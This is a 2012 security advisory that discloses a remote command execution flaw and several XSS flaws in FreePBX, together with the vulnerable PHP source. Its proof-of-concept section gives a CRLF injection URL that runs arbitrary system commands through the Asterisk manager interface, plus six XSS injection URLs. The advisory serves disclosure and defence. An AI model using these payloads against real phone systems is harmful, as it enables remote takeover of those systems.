Product: FreePBX
Version: 2.10.0, 2.9.0 and perhaps earlier versions
Type: Remote Command Execution, XSS
Release Date: March 14, 2012
Vendor Notification Date: Jun 12, 2011
Author: Martin Tschirsich


Overview:


A remote command execution vulnerability and some XSS in current and earlier
FreePBX versions due to missing input sanitization.
FreePBX is a popular implementation (500,000 active phone systems) of
Asterisk (telephony software) based around a web-based configuration
interface and other tools. Some of these installations are on a public IP
address.


Proof of Concept:

RCE:
[HOST]/recordings/misc/callme_page.php?action=c&callmenum=[PHONENUMBER]@from
-internal/n%0D%0AApplication:%20system%0D%0AData:%20[CMD]%0D%0A%0D%0A

XSS (2.9.0 and perhaps other versions):
[HOST]/panel/index_amp.php?context=[XSS]
[HOST]/panel/flash/mypage.php?clid=[XSS]
[HOST]/panel/flash/mypage.php?clidname=[base64_encode(XSS)]
[HOST]/panel/dhtml/index.php?context=/../%00">[XSS]
[HOST]/admin/views/freepbx_reload.php/"</script>[XSS]
[HOST]/recordings/index.php?login='>[XSS]


Details (RCE):

Missing input sanitization in htdocs/recordings/misc/callme_page.php:
// line 28-30:
$to         = $_REQUEST['callmenum']; // vulnerable
$msgFrom    = $_REQUEST['msgFrom'];
$new_path   = substr($path, 0, -4);
// line 38:
$call_status = callme_startcall($to, $msgFrom, $new_path);

Missing input sanitization in htdocs/recordings/includes/callme.php:
// line 88-117:
function callme_startcall($to, $from, $new_path)
{
        global $astman;
        $channel        = "Local/$to () from-internal/n";  // vulnerable
        $context        = "vm-callme";
        $extension      = "s";
        $priority       = "1";
        $callerid       = "VMAIL/$from";
        ...
        /* Arguments to Originate: channel, extension, context, priority,
timeout, callerid, variable, account, application, data */
        $status = $astman->Originate($channel, $extension, $context,
$priority, NULL, $callerid, $variable, NULL, NULL, NULL, NULL);
        ...
}
